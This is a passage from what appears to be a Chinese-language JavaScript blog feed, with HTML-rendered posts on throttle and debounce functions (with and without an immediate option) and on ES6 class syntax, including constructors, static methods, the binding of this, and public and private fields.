class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DEMO</span></span><br><span class="line"><span class="comment">// 执行 throttle 函数返回新函数</span></span><br><span class="line"><span class="keyword">const</span> betterFn = throttle(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;fn 函数执行了&#x27;</span>), <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// 每 10 毫秒执行一次 betterFn 函数，但是只有时间差大于 1000 时才会执行 fn</span></span><br><span class="line"><span class="built_in">setInterval</span>(betterFn, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><blockquote><p>补充</p></blockquote><p>+new Date() 会调用Date.prototype 上面的valueOf方法，根据</p><p>下面的例子返回效果等同：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>().valueOf();</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>()*<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="手写一个-debounce"><a href="#手写一个-debounce" class="headerlink" title="手写一个 debounce"></a>手写一个 debounce</h4><p>防抖函数 <code>debounce</code> 指的是<strong>某个函数在某段时间内，无论触发了多少次回调，都只执行最后一次</strong></p><p>实现原理就是利用<strong>定时器</strong>，函数第一次执行时设定一个定时器，之后调用时发现已经设定过定时器就清空之前的定时器，并重新设定一个新的定时器，如果存在没有被清空的定时器，当定时器计时结束后触发函数执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fn 是需要防抖处理的函数</span></span><br><span class="line"><span class="comment">// wait 是时间间隔</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, wait = <span class="number">50</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过闭包缓存一个定时器 id</span></span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span></span><br><span class="line">    <span class="comment">// 将 debounce 处理结果当作函数返回</span></span><br><span class="line">    <span class="comment">// 触发事件回调时执行这个返回函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// 如果已经设定过定时器就清空上一次的定时器</span></span><br><span class="line">        <span class="keyword">if</span> (timer) <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 开始设定一个新的定时器，定时器结束后执行传入的函数 fn</span></span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            fn(...args)</span><br><span class="line">        &#125;, wait)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DEMO</span></span><br><span class="line"><span class="comment">// 执行 debounce 函数返回新函数</span></span><br><span class="line"><span class="keyword">const</span> betterFn = debounce(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;fn 防抖执行了&#x27;</span>), <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// 停止滑动 1 秒后执行函数 () =&gt; console.log(&#x27;fn 防抖执行了&#x27;)</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, betterFn)</span><br></pre></td></tr></table></figure><p><strong>剩余参数</strong> <code>...args</code> 允许我们将不确定数量的<strong>剩余的元素</strong>放到一个<strong>数组</strong>中。</p><p>不过 <code>underscore</code> 中的 <code>debounce</code> 还有第三个参数：<code>immediate</code> 。这个参数是做什么用的呢？</p><blockquote><p>传参 <strong>immediate</strong> 为 true， <strong>debounce</strong>会在 <strong>wait</strong> 时间间隔的开始调用这个函数 。（注：并且在 wait 的时间之内，不会再次调用。）在类似不小心点了提交按钮两下而提交了两次的情况下很有用。</p></blockquote><p>把 <code>true</code> 传递给 <code>immediate</code> 参数，会让 <code>debounce</code> 在 <code>wait</code> 时间开始计算之前就触发函数（也就是没有任何延时就触发函数），而不是过了 <code>wait</code> 时间才触发函数，而且在 <code>wait</code> 时间内也不会触发（相当于把 <code>fn</code> 的执行锁住）。 如果不小心点了两次提交按钮，第二次提交就会不会执行。</p><p>那我们根据 <code>immediate</code> 的值来决定如何执行 <code>fn</code> 。如果是 <code>immediate</code> 的情况下，我们立即执行 <code>fn</code> ，并在 <code>wait</code> 时间内锁住 <code>fn</code> 的执行， <code>wait</code> 时间之后再触发，才会重新执行 <code>fn</code> ，以此类推。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// immediate 表示第一次是否立即执行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, wait = <span class="number">50</span>, immediate</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// this保存给context</span></span><br><span class="line">        <span class="keyword">const</span> context = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (timer) <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// immediate 为 true 表示第一次触发后执行</span></span><br><span class="line">      <span class="comment">// timer 为空表示首次触发</span></span><br><span class="line">        <span class="keyword">if</span> (immediate &amp;&amp; !timer) &#123;</span><br><span class="line">            fn.apply(context, args);</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            fn.apply(context, args);</span><br><span class="line">        &#125;, wait)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DEMO</span></span><br><span class="line"><span class="comment">// 执行 debounce 函数返回新函数</span></span><br><span class="line"><span class="keyword">const</span> betterFn = debounce(<span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;fn 防抖执行了&#x27;</span>), <span class="number">1000</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="comment">// 第一次触发 scroll 执行一次 fn，后续只有在停止滑动 1 秒后才执行函数 fn</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;scroll&#x27;</span>, betterFn)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;闭包&quot;&gt;&lt;a href=&quot;#闭包&quot; class=&quot;headerlink&quot; title=&quot;闭包&quot;&gt;&lt;/a&gt;闭包&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;一个函数&lt;/strong&gt;和对其周围状态（&lt;strong&gt;lexical environment，词法环境&lt;/strong&gt;</summary>
      
    
    
    
    <category term="JS" scheme="https://lesliewaong.top/categories/JS/"/>
    
    
    <category term="作用域" scheme="https://lesliewaong.top/tags/%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
    
    <category term="闭包" scheme="https://lesliewaong.top/tags/%E9%97%AD%E5%8C%85/"/>
    
    <category term="节流" scheme="https://lesliewaong.top/tags/%E8%8A%82%E6%B5%81/"/>
    
    <category term="防抖" scheme="https://lesliewaong.top/tags/%E9%98%B2%E6%8A%96/"/>
    
  </entry>
  
  <entry>
    <title>Class 的基本语法</title>
    <link href="https://lesliewaong.top/posts/aa436af0.html"/>
    <id>https://lesliewaong.top/posts/aa436af0.html</id>
    <published>2022-02-18T13:01:02.000Z</published>
    <updated>2022-03-25T14:08:26.386Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Class-的基本语法"><a href="#Class-的基本语法" class="headerlink" title="Class 的基本语法"></a>Class 的基本语法</h1><p><strong>类是用于创建对象的模板。他们用代码封装数据以处理该数据。</strong> </p><p>JS中的类建立在<strong>原型</strong>上，但也具有某些语法和语义未与ES5类相似语义共享。</p><h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><p>实际上，类是“特殊的<strong>函数</strong>”，就像你能够定义的<strong>函数表达式</strong>和<strong>函数声明</strong>一样，类语法有两个组成部分：<strong>类表达式</strong>和<strong>类声明</strong>。</p><h3 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h3><p>定义类的一种方法是使用<strong>类声明</strong>。要声明一个类，你可以使用带有<code>class</code>关键字的类名（这里是“Rectangle”）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="提升"><a href="#提升" class="headerlink" title="提升"></a>提升</h4><p><strong>函数声明</strong>和<strong>类声明</strong>之间的一个重要区别在于, <strong>函数声明会提升，类声明不会</strong>。你首先需要声明你的类，然后再访问它，否则类似以下的代码将抛出<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ReferenceError"><code>ReferenceError</code></a>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Rectangle(); <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="类表达式"><a href="#类表达式" class="headerlink" title="类表达式"></a>类表达式</h3><p><strong>类表达式</strong>是定义类的另一种方法。类表达式可以命名或不命名。</p><p>命名类表达式的名称是该类体的局部名称。(不过，可以通过<strong>类</strong>的(而不是一个实例的) <code>name</code>属性来检索它)。</p><p>下面的<code>Rectangle2</code>只在 <strong>Class 的内部可用，指代当前类</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未命名/匿名类</span></span><br><span class="line"><span class="keyword">let</span> Rectangle = <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Rectangle.name);</span><br><span class="line"><span class="comment">// output: &quot;Rectangle&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 命名类</span></span><br><span class="line"><span class="keyword">let</span> Rectangle = <span class="class"><span class="keyword">class</span> <span class="title">Rectangle2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Rectangle.name);</span><br><span class="line"><span class="comment">// 输出: &quot;Rectangle2&quot;</span></span><br></pre></td></tr></table></figure><p><strong>备注：</strong> 类<strong>表达式</strong>也同样受到<strong>类声明</strong>部分中提到的类型提升的限制。</p><p>类必须使用<code>new</code>调用，否则会报错。这是它跟普通构造函数的一个主要区别，后者不用<code>new</code>也可以执行。</p><h2 id="类体和方法定义"><a href="#类体和方法定义" class="headerlink" title="类体和方法定义"></a>类体和方法定义</h2><p>一个类的类体是一对花括号/大括号 <code>&#123;&#125;</code> 中的部分。这是你定义类成员的位置，如方法或构造函数。</p><h3 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h3><p>类声明和类表达式的主体都执行在<strong>严格模式</strong>下。比如，构造函数，静态方法，原型方法，getter和setter都在严格模式下执行。</p><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><p><code>constructor</code>方法是一个特殊的方法，这种方法用于<strong>创建和初始化</strong>一个由<code>class</code>创建的对象。一个类只能拥有一个名为 “constructor”的特殊方法。如果类包含多个<code>constructor</code>的方法，则将抛出 一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/SyntaxError"><code>SyntaxError</code></a> 。</p><p>一个构造函数可以使用 <code>super</code> 关键字来<strong>调用一个父类的构造函数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Polygon</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">length</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// 在这里, 它调用了父类的构造函数, 并将 lengths 提供给 Polygon 的&quot;width&quot;和&quot;height&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(length, length);</span><br><span class="line">        <span class="comment">// 注意: 在派生类中, 必须先调用 super() 才能使用 &quot;this&quot;。</span></span><br><span class="line">        <span class="comment">// 忽略这个，将会导致一个引用错误。</span></span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&#x27;Square&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span> <span class="title">area</span>(<span class="params">value</span>) &#123;</span><br><span class="line">        <span class="comment">// 注意：不可使用 this.area = value</span></span><br><span class="line">        <span class="comment">// 否则会导致循环call setter方法导致爆栈</span></span><br><span class="line">        <span class="built_in">this</span>._area = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果没有显式指定构造方法，则会添加默认的 constructor 方法。</p><p>如果不指定一个构造函数(constructor)方法, 则使用一个**默认的构造函数(constructor)**。</p><p>对于基类，默认构造函数是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>对于派生类，默认构造函数是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">constructor</span>(<span class="params">...args</span>)</span> &#123;</span><br><span class="line">  <span class="built_in">super</span>(...args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="原型方法"><a href="#原型方法" class="headerlink" title="原型方法"></a>原型方法</h3><p>构造函数的<code>prototype</code>属性，在 ES6 的“类”上面继续存在。事实上，类的所有非静态方法都定义在类的<code>prototype</code>属性上面。</p><p>因此，<strong>在类的实例上面调用方法，其实就是调用原型上的方法</strong>。</p><p>另外，类的内部所有定义的方法，都是<strong>不可枚举的（non-enumerable）</strong>。这一点与 ES5 的行为不一致。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">    <span class="comment">// constructor</span></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Getter</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.calcArea()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Method</span></span><br><span class="line">    <span class="function"><span class="title">calcArea</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> square = <span class="keyword">new</span> Rectangle(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(square.area);</span><br><span class="line"><span class="comment">// 100</span></span><br></pre></td></tr></table></figure><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p><code>static</code> 关键字用来定义一个类的一个静态方法。调用静态方法不需要<strong>实例化</strong>该类，但<strong>不能通过一个类实例调用静态方法</strong>。静态方法通常用于<strong>为一个应用程序创建工具函数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">x, y</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> displayName = <span class="string">&quot;Point&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">distance</span>(<span class="params">a, b</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> dx = a.x - b.x;</span><br><span class="line">        <span class="keyword">const</span> dy = a.y - b.y;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.hypot(dx, dy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> Point(<span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> Point(<span class="number">10</span>,<span class="number">10</span>);</span><br><span class="line">p1.displayName;</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line">p1.distance;</span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Point.displayName);</span><br><span class="line"><span class="comment">// &quot;Point&quot;</span></span><br><span class="line"><span class="built_in">console</span>.log(Point.distance(p1, p2));</span><br><span class="line"><span class="comment">// 7.0710678118654755</span></span><br></pre></td></tr></table></figure><h3 id="用原型和静态方法绑定-this"><a href="#用原型和静态方法绑定-this" class="headerlink" title="用原型和静态方法绑定 this"></a>用原型和静态方法绑定 this</h3><p>当调用静态或原型方法时没有指定 this的值，那么方法内的 this值将被置为 <strong><code>undefined</code><strong>。即使你未设置 <code>&quot;use strict&quot;</code> ，因为 <code>class</code> 体</strong>内部的代码总是在严格模式下执行</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">speak</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="function"><span class="title">eat</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> Animal();</span><br><span class="line">obj.speak(); <span class="comment">// Animal &#123;&#125;</span></span><br><span class="line"><span class="keyword">let</span> speak = obj.speak;</span><br><span class="line">speak(); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">Animal.eat() <span class="comment">// class Animal</span></span><br><span class="line"><span class="keyword">let</span> eat = Animal.eat;</span><br><span class="line">eat(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>如果上述代码通过传统的基于函数的语法来实现，那么依据初始的 this 值，在非严格模式下方法调用会发生自动装箱。若初始值是 <code>undefined</code>，this 值会被设为全局对象。</p><p>严格模式下不会发生自动装箱，this 值将保留传入状态。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">Animal.prototype.speak = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Animal.eat = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> Animal();</span><br><span class="line"><span class="keyword">let</span> speak = obj.speak;</span><br><span class="line">speak(); <span class="comment">// global object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> eat = Animal.eat;</span><br><span class="line">eat(); <span class="comment">// global object</span></span><br></pre></td></tr></table></figure><h3 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h3><p><strong>实例的属性必须定义在类的方法里：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>静态的或原型的数据属性必须定义在类定义的外面。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rectangle.staticWidth = <span class="number">20</span>;</span><br><span class="line">Rectangle.prototype.prototypeWidth = <span class="number">25</span>;</span><br></pre></td></tr></table></figure><h3 id="字段声明"><a href="#字段声明" class="headerlink" title="字段声明"></a>字段声明</h3><blockquote><p><strong>警告：</strong>公共和私有字段声明是JavaScript标准委员会TC39提出的实验性功能（第3阶段）。浏览器中的支持是有限的，但是可以通过Babel等系统构建后使用此功能。</p></blockquote><h4 id="公有字段声明"><a href="#公有字段声明" class="headerlink" title="公有字段声明"></a>公有字段声明</h4><p>使用JavaScript字段声明语法，上面的示例可以写成：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  height = <span class="number">0</span>;</span><br><span class="line">  width;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.height = height;</span><br><span class="line">    <span class="built_in">this</span>.width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过预先声明字段，<strong>类定义变得更加自我记录，并且字段始终存在。</strong></p><p>正如上面看到的，这个字段<strong>可以用也可以不用默认值来声明</strong>。</p><h4 id="私有字段声明"><a href="#私有字段声明" class="headerlink" title="私有字段声明"></a>私有字段声明</h4><p>使用私有字段，可以按以下方式细化定义。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">  #height = <span class="number">0</span>;</span><br><span class="line">  #width;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.#height = height;</span><br><span class="line">    <span class="built_in">this</span>.#width = width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>从类外部引用私有字段是错误的。</strong>它们只能在类里面中读取或写入。通过定义在类外部不可见的内容，可以确保类的用户不会依赖于内部，因为内部可能在不同版本之间发生变化。</p><p><strong>备注：</strong><code>私有字段仅能在字段声明中预先定义</code>。 </p><p><strong>私有字段不能通过在之后赋值来创建它们，这种方式只适用普通属性。</strong></p><h2 id="使用-extends-扩展子类"><a href="#使用-extends-扩展子类" class="headerlink" title="使用 extends 扩展子类"></a>使用 <code>extends</code> 扩展子类</h2><p><code>extends</code> 关键字在 类声明或类表达式中用于创建一个类作为另一个类的一个子类。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 